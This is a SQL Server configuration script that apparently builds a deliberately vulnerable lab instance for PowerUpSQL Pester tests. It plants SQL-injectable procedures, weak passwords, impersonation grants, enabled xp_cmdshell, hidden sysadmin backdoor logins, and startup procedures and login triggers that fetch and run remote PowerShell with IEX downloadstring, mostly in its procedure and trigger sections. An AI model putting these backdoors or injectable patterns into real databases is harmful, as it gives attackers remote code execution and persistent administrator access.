-- Script: pesterdb.sql
-- Description: This script can be used to configure a new SQL Server 2014 instance for PowerUpSQL Pester tests.

------------------------------------------------------------
-- Create Logins, Database Users, and Grant Assembly Privs
------------------------------------------------------------

-- Create db_ddladmin login
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_ddladmin')
CREATE LOGIN [test_login_ddladmin] WITH PASSWORD = 'test_login_ddladmin', CHECK_POLICY = OFF;

-- Create db_ddladmin database user
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_ddladmin')
CREATE USER [test_login_ddladmin] FROM LOGIN [test_login_ddladmin];
GO

-- Add test_login_ddladmin to db_ddladmin role
EXEC sp_addrolemember [db_ddladmin], [test_login_ddladmin];
GO

-- Create login with the CREATE ASSEMBLY database privilege
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_createassembly')
CREATE LOGIN [test_login_createassembly] WITH PASSWORD = 'test_login_createassembly', CHECK_POLICY = OFF;

-- Create test_login_createassembly database user
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_createassembly')
CREATE USER [test_login_createassembly] FROM LOGIN [test_login_createassembly];
GO

-- Add privilege
GRANT CREATE ASSEMBLY to [test_login_createassembly];
GO

-- Create login with the ALTER ANY ASSEMBLY database privilege
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_alterassembly')
CREATE LOGIN [test_login_alterassembly] WITH PASSWORD = 'test_login_alterassembly', CHECK_POLICY = OFF;

-- Create test_login_alterassembly database user
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_alterassembly')
CREATE USER [test_login_alterassembly] FROM LOGIN [test_login_alterassembly];
GO

-- Add privilege
GRANT ALTER ANY ASSEMBLY to [test_login_alterassembly];
GO
------------------------------------------------------------
-- Create Test SQL Logins
------------------------------------------------------------

-- Select master database
USE master
GO
 
--- Create least privilege server login
If Exists (select loginname from master.dbo.syslogins where name = 'test_login_user')
DROP LOGIN [test_login_user]
GO

If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_user')
CREATE LOGIN [test_login_user] WITH PASSWORD = 'test_login_user', CHECK_POLICY = OFF;
GO

-- Create sysadmin server login
If Exists (select loginname from master.dbo.syslogins where name = 'test_login_admin')
DROP LOGIN [test_login_admin]
GO

If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_admin')
CREATE LOGIN [test_login_admin] WITH PASSWORD = 'test_login_admin', CHECK_POLICY = OFF;
EXEC sp_addsrvrolemember 'test_login_admin', 'sysadmin';
GO

-- Create impersonation login 1
if not Exists (select loginname from master.dbo.syslogins where name = 'test_login_impersonate1')
CREATE LOGIN [test_login_impersonate1] WITH PASSWORD = 'test_login_impersonate1', CHECK_POLICY = OFF;
GO

-- Grant impersonate on sa to test_login_impersonate1
GRANT IMPERSONATE ON LOGIN::sa to [test_login_impersonate1];
GO

-- Create impersonation login 2
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_impersonate2')
CREATE LOGIN [test_login_impersonate2] WITH PASSWORD = 'test_login_impersonate2', CHECK_POLICY = OFF;
GO

-- Grant impersonate on test_login_impersonate1 to test_login_impersonate2
GRANT IMPERSONATE ON LOGIN::test_login_impersonate2 to [test_login_impersonate2];
GO

-- Create impersonation login 3
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_impersonate3')
CREATE LOGIN [test_login_impersonate3] WITH PASSWORD = 'test_login_impersonate2', CHECK_POLICY = OFF;
GO

-- Grant impersonate on test_login_impersonate2 to test_login_impersonate3
GRANT IMPERSONATE ON LOGIN::test_login_impersonate1 to [test_login_impersonate3];
GO

-- Create db_owner login
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_dbowner')
CREATE LOGIN [test_login_dbowner] WITH PASSWORD = 'test_login_dbowner', CHECK_POLICY = OFF;
GO

-- Create ownership chaining login
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_ownerchain')
CREATE LOGIN [test_login_ownerchain] WITH PASSWORD = 'test_login_ownerchain', CHECK_POLICY = OFF;
GO

-- Create server link login
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_dblink')
CREATE LOGIN [test_login_dblink] WITH PASSWORD = 'test_login_dblink', CHECK_POLICY = OFF;
GO

-- Create ddladmin login
If not Exists (select loginname from master.dbo.syslogins where name = 'ddladminuser')
CREATE LOGIN [ddladminuser] WITH PASSWORD = 'ddladminuser', CHECK_POLICY = OFF;
GO

-- Create  test_login_credential login
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_credential')
CREATE LOGIN [test_login_credential] WITH PASSWORD = 'test_login_credential', CHECK_POLICY = OFF;
GO

-- Create credential
If not Exists (select name from sys.credentials where name = 'MyCred1')
CREATE CREDENTIAL MyCred1 WITH IDENTITY = 'winuser',SECRET = 'password';  
GO 

-- Add credential to login
If not Exists (select name from sys.credentials where name = 'MyCred1')
ALTER LOGIN test_login_credential
WITH CREDENTIAL = MyCred1;
GO

-- Create custom server role
If not Exists (select name from sys.server_principals  where name = 'EvilServerRole')
CREATE SERVER ROLE EvilServerRole
GO

-- Add login to role
If not Exists (select name from sys.server_principals  where name = 'EvilServerRole')
EXEC sp_addsrvrolemember 'test_login_user', 'EvilServerRole';
GO


------------------------------------------------------------
-- Create Test Databases
------------------------------------------------------------

-- Create testdb for senstive data tests
If not Exists (select name from master.dbo.sysdatabases where name = 'testdb')
CREATE DATABASE testdb
GO

-- Create testdb2 for db_owner tests
If not Exists (select name from master.dbo.sysdatabases where name = 'testdb2')
CREATE DATABASE testdb2
GO

-- Create database testdb3
If not Exists (select name from master.dbo.sysdatabases where name = 'testdb3')
CREATE DATABASE testdb3
GO

------------------------------------------------------------
-- Create Test Database Users
------------------------------------------------------------

-- Select testdb2 database
USE testdb2 
GO

-- Set testdb2 as the default db for test_login_dbowner
ALTER LOGIN [test_login_dbowner] with default_database = [testdb2];
GO

-- Create database user for test_login_dbowner login
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_dbowner')
CREATE USER [test_login_dbowner] FROM LOGIN [test_login_dbowner];
GO

-- Add the test_login_dbowner database user to the db_owner role in the testdb2 database
EXEC sp_addrolemember [db_owner], [test_login_dbowner];
GO

-- Set testdb2 as the default db for ddladminuser
ALTER LOGIN [ddladminuser] with default_database = [testdb2];
GO

-- Create database user for ddladminuser login
If not Exists (SELECT name FROM sys.database_principals where name = 'ddladminuser')
CREATE USER [ddladminuser] FROM LOGIN [ddladminuser];
GO

-- Add the ddladminuser database user to the db_ddladmin role in the testdb2 database
EXEC sp_addrolemember [db_ddladmin], [ddladminuser];
GO

-- Select master database
USE master
GO

-- Create database user for user login
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_user')
CREATE USER [test_login_user] FROM LOGIN [test_login_user];
GO

-- Provide the user database user with the CREATE PROCEDURE privilege in the master db
GRANT CREATE PROCEDURE TO [test_login_user]

-- Select testdb3 database
USE testdb3
GO

-- Set default database for test_login_ownerchain
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_ownerchain')
ALTER LOGIN [test_login_ownerchain] with default_database = [testdb3];
GO

-- Create database account for test_login_ownerchain
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_ownerchain')
CREATE USER [test_login_ownerchain] FROM LOGIN [test_login_ownerchain];
GO

-- Select testdb
USE testdb

-- Create custom role
If not Exists (SELECT name FROM sys.database_principals where name = 'EvilRole1')
CREATE ROLE EvilRole1 AUTHORIZATION db_owner;  
GO  

-- Add user to role
If not Exists (SELECT name FROM sys.database_principals where name = 'EvilRole1')
EXEC sp_addrolemember 'EvilRole1','test_login_user';  

------------------------------------------------------------
-- Create Test Tables
------------------------------------------------------------

-- Select testdb databases
USE testdb
GO

-- Create noclist table for ownership chaining test
If not Exists (SELECT name FROM sys.tables WHERE name = 'NOCList')
CREATE TABLE dbo.NOCList
(SpyName text NOT NULL,RealName text NULL)
GO

-- Create tracking table for sensitive data test
If not Exists (SELECT name FROM sys.tables WHERE name = 'tracking')
 CREATE TABLE [dbo].[tracking](
	[card] [varchar](50) NULL
) ON [PRIMARY]
GO

-- Create secrets table for sensitive data test
If not Exists (SELECT name FROM sys.tables WHERE name = 'secrets')
CREATE TABLE [dbo].[secrets](
	[password] [nchar](200) NULL
) ON [PRIMARY]
GO

-- Select testdb3 databases
USE testdb3
GO

-- Create table1
If not Exists (SELECT name FROM sys.tables WHERE name = 'NOCList')
CREATE TABLE dbo.NOCList
(SpyName text NOT NULL,RealName text NULL)

-- Create table2
If not Exists (SELECT name FROM sys.tables WHERE name = 'NOCList2')
CREATE TABLE dbo.NOCList2
(SpyName text NOT NULL,RealName text NULL)


------------------------------------------------------------
-- Create Test Views
------------------------------------------------------------

-- Select testdb3 databases
USE testdb3
GO

-- Create view nocview
IF Object_ID('NOCView') IS NOT NULL
    DROP VIEW NocView
GO
CREATE VIEW NocView 
AS
SELECT * FROM NOCList
GO

-- Grant select privilege to chainuser
if exists (select name from sys.views where name = 'nocview')
GRANT SELECT ON OBJECT::dbo.NocView TO test_login_ownerchain
GO

-- Create view nocview2
IF Object_ID('NOCView2') IS NOT NULL
    DROP VIEW NocView2
GO
CREATE VIEW NocView2 
AS
SELECT * FROM NOCList2
GO


------------------------------------------------------------
-- Create Test Records
------------------------------------------------------------

-- Select testdb database
USE testdb
GO

-- Add sample records to nolist table for ownership chaining test
If Exists (SELECT name FROM sys.tables WHERE name = 'NOCList')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Sean Connery')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Ethan Hunt','Tom Cruise')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Jason Bourne','Matt Damon')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Daniel Craig')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Pierce Bronsan')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Roger Moore')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Timothy Dolton')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','George Lazenby')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Harry Hart',' Colin Firth')
GO

-- Select testdb database
USE testdb
GO

-- Add sample records to tracking table for sensitive data test
If Exists (SELECT name FROM sys.tables WHERE name = 'tracking')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('6011998081409707')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('4012888888881881')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('601199808140asdf')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('40128888888')
GO

-- Select testdb database
USE testdb
GO

-- Add sample records to secrets table for sensitive data test
If Exists (SELECT name FROM sys.tables WHERE name = 'secrets')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('password1')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('password2')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('password23')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('SueprPassword123!')
GO

-- Select testdb3 databases
USE testdb3
GO

-- Add sample records to table
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Sean Connery')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Ethan Hunt','Tom Cruise')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Jason Bourne','Matt Damon')

-- Add sample records to table
INSERT dbo.NOCList2 (SpyName, RealName)
VALUES ('Sydney Bristow','Jennifer Garner')
INSERT dbo.NOCList2 (SpyName, RealName)
VALUES ('Evelyn Salt','Angelina Jolie')
INSERT dbo.NOCList2 (SpyName, RealName)
VALUES ('Annie Walker','Piper Perabo')
INSERT dbo.NOCList2 (SpyName, RealName)
VALUES ('Perry the Platypus','Dee Bradley Baker')


------------------------------------------------------------
-- Setup Test Server Configurations
------------------------------------------------------------

-- Select master database
USE master

-- Set master as trustworthy
ALTER DATABASE master SET TRUSTWORTHY ON
GO

-- Enable ownership chaining on the testdb
ALTER DATABASE testdb SET DB_CHAINING ON
GO

-- Enable ownership chaining server wide
EXECUTE sp_configure 'show advanced', 1;
RECONFIGURE;
GO

EXECUTE sp_configure 'cross db ownership chaining', 1;
RECONFIGURE;
GO

-- Enable xp_cmdshell
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO
 
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO

-- Select the master database
USE master
GO

-- Create server link
If not Exists (select srvname from master..sysservers where srvname = 'sqlserver1\instance1')
EXEC master.dbo.sp_addlinkedserver 
    	@server = N'sqlserver1\instance1', 
   	@srvproduct=N'SQL Server' ;
GO

-- Add login to link
If Exists (select srvname from master..sysservers where srvname = 'sqlserver1\instance1')
EXEC sp_addlinkedsrvlogin 'sqlserver1\instance1', 'false', NULL, 'linklogin', 'linklogin';
GO


------------------------------------------------------------
-- Create Audit, Server Spec, and Database Spec
------------------------------------------------------------

-- Select master database
USE master
GO
 
-- Create audit
if not exists (select * FROM sys.server_audits where name = 'Audit_Object_Changes')
CREATE SERVER AUDIT Audit_Object_Changes
TO APPLICATION_LOG
WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE)
ALTER SERVER AUDIT Audit_Object_Changes
WITH (STATE = ON)
GO

-- Create server audit specification
if not exists (select name from sys.server_audit_specifications where name = 'Audit_Server_Level_Object_Changes')
CREATE SERVER AUDIT SPECIFICATION Audit_Server_Level_Object_Changes
FOR SERVER AUDIT Audit_Object_Changes
ADD (SERVER_OBJECT_CHANGE_GROUP),
ADD (SERVER_OBJECT_PERMISSION_CHANGE_GROUP),
ADD (SERVER_PERMISSION_CHANGE_GROUP),
ADD (SERVER_PRINCIPAL_IMPERSONATION_GROUP)
WITH (STATE = ON)
GO

-- Create the database audit specification
if not exists (select name from sys.database_audit_specifications where name = 'Audit_Database_Level_Object_Changes')
CREATE DATABASE AUDIT SPECIFICATION Audit_Database_Level_Object_Changes
FOR SERVER AUDIT Audit_Object_Changes
ADD (DATABASE_OBJECT_CHANGE_GROUP) 
WITH (STATE = ON)
GO


------------------------------------------------------------
-- Create Test Procedures
------------------------------------------------------------

-- Select master database
USE master
GO

-- Create procedure vulnerable to SQL injection
-- Create view nocview
IF Object_ID('sp_sqli1') IS NOT NULL
    DROP PROC sp_sqli1
GO
CREATE PROCEDURE sp_sqli1
@DbName varchar(max)
WITH EXECUTE AS OWNER
AS
BEGIN
Declare @query as varchar(max)
SET @query = 'SELECT name FROM master..sysdatabases where name like ''%'+ @DbName+'%'' OR name=''tempdb''';
EXECUTE(@query)
END
GO
 
-- Allow members of PUBLIC to execute it
if exists (select name from sys.procedures where name = 'sp_sqli1')
GRANT EXECUTE ON sp_sqli1 to PUBLIC
GO

-- Select master database
USE master
GO

-- Create proc to add sysadmin
IF Object_ID('sp_add_backdoor_account') IS NOT NULL
    DROP PROC sp_add_backdoor_account
GO
CREATE PROCEDURE sp_add_backdoor_account
AS
CREATE LOGIN backdoor_account WITH PASSWORD = 'backdoor_account', CHECK_POLICY = OFF;
EXEC sp_addsrvrolemember 'backdoor_account', 'sysadmin';
GO
 
-- Create proc to download and run powershell code
IF Object_ID('sp_add_backdoor') IS NOT NULL
    DROP PROC sp_add_backdoor
GO
CREATE PROCEDURE sp_add_backdoor
AS
-- Download and execute PowerShell code from the internet
EXEC master..xp_cmdshell 'powershell -C "Invoke-Expression (new-object System.Net.WebClient).DownloadString(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1'')"'
GO

-- Configure stored procedures to run at startup
-- Set 'sp_add_backdoor_account' to auto run
EXEC sp_procoption @ProcName = 'sp_add_backdoor_account',
@OptionName = 'startup',
@OptionValue = 'on';
GO
 
-- Setup 'sp_add_backdoor' to auto run
EXEC sp_procoption @ProcName = 'sp_add_backdoor',
@OptionName = 'startup',
@OptionValue = 'on';
GO

-- Select testdb2 database
USE testdb2
GO

-- Create procedure to add test_login_dbowner to the sysadmin fixed server role (should be execute as db_owner)
IF Object_ID('sp_elevate_me') IS NOT NULL
    DROP PROC sp_elevate_me
GO
CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'test_login_dbowner','sysadmin'
GO

-- Create sp_sqli2 procedure
IF Object_ID('sp_sqli2') IS NOT NULL
    DROP PROC sp_sqli2
GO
CREATE PROCEDURE sp_sqli2
@DbName varchar(max)
AS
BEGIN
Declare @query as varchar(max)
SET @query = 'SELECT name FROM master..sysdatabases where name like ''%'+ @DbName+'%'' OR name=''tempdb''';
EXECUTE(@query)
END
GO

-- Allow members of PUBLIC to execute it
if exists (select name from sys.procedures where name  = 'sp_sqli2')
GRANT EXECUTE ON sp_sqli2 to PUBLIC
GO

-- Select database testdb3
USE testdb3
GO

-- Create procedure sp_findspy
IF Object_ID('sp_findspy') IS NOT NULL
    DROP PROC sp_findspy
GO
CREATE PROCEDURE sp_findspy
@spy varchar(max)
AS
BEGIN
Declare @query as varchar(max)
SET @query = 'SELECT * FROM NOCView where SpyName like ''%'+ @spy+'%'''; 
EXECUTE(@query)
END
GO

-- Allow the user to execute it
if exists (select name from sys.procedures where name = 'sp_findspy')
GRANT EXECUTE ON sp_findspy to test_login_ownerchain
GO

-- Create procedure 2
IF Object_ID('sp_findspy2') IS NOT NULL
    DROP PROC sp_findspy2
GO
CREATE PROCEDURE sp_findspy2
AS
SELECT * FROM NOCView2 
GO

-- Allow the user to execute it
if exists (select name from sys.procedures where name = 'sp_findspy2')
GRANT EXECUTE ON sp_findspy2 to test_login_ownerchain
GO


------------------------------------------------------------
-- Create Test Triggers
------------------------------------------------------------

-- Select master database
USE master
GO

-- Create the DDL trigger
IF exists (select name from sys.server_triggers where name = 'persistence_ddl_1')
    DROP TRIGGER [persistence_ddl_1] on all server
GO

CREATE Trigger [persistence_ddl_1]
ON ALL Server
FOR DDL_LOGIN_EVENTS
AS
 
-- Download and run a PowerShell script from the internet
EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_ddl.ps1'')"';
 
-- Add a sysadmin named 'SysAdmin_DDL' if it doesn't exist
if (SELECT count(name) FROM sys.sql_logins WHERE name like 'SysAdmin_DDL') = 0
 
	-- Create a login
	CREATE LOGIN SysAdmin_DDL WITH PASSWORD = 'SysAdmin_DDL', CHECK_POLICY = OFF;;
	
	-- Add the login to the sysadmin fixed server role
	EXEC sp_addsrvrolemember 'SysAdmin_DDL', 'sysadmin';
GO

-- Select testdb database
USE testdb
GO
 
-- Create the DML trigger
IF Object_ID('persistence_dml_1') IS NOT NULL
    DROP trigger persistence_dml_1
GO
CREATE TRIGGER [persistence_dml_1]
ON testdb.dbo.NOCList 
FOR INSERT, UPDATE, DELETE AS
 
-- Download a PowerShell script from the internet to memory and execute it
EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_dml.ps1'')"';
 
-- Add a sysadmin named 'SysAdmin_DML' if it doesn't exist
if (select count(*) from sys.sql_logins where name like 'SysAdmin_DML') = 0
 
	-- Create a login
	CREATE LOGIN SysAdmin_DML WITH PASSWORD = 'SysAdmin_DML', CHECK_POLICY = OFF;;
	
	-- Add the login to the sysadmin fixed server role
	EXEC sp_addsrvrolemember 'SysAdmin_DML', 'sysadmin';
GO


------------------------------------------------------------
-- Create Test Keys, Certificates, and Cert Logins
------------------------------------------------------------

-- Select master database
USE master

-- Create a master key for the database
IF (select count(name)  from sys.symmetric_keys where name like '%DatabaseMasterKey%') = 0
CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'SuperSecretPasswordHere!';
GO

-- Create certificate for the sp_sqli2 procedure
If not Exists (select name from sys.certificates where name = 'sp_sqli2_cert')
CREATE CERTIFICATE sp_sqli2_cert
WITH SUBJECT = 'This should be used to sign the sp_sqli2',
EXPIRY_DATE = '2050-10-20';
GO

-- Create cert login
If not Exists (select loginname from master.dbo.syslogins where name = 'certuser')
CREATE LOGIN certuser
FROM CERTIFICATE sp_sqli2_cert

-- Add cert to stored procedure
If not Exists (select loginname from master.dbo.syslogins where name = 'certuser')
ADD SIGNATURE to sp_sqli2
BY CERTIFICATE sp_sqli2_cert;
GO

-- Add the certuser to the sysadmin role
If not Exists (select loginname from master.dbo.syslogins where name = 'certuser')
EXEC sp_addsrvrolemember 'certuser', 'sysadmin';
GO
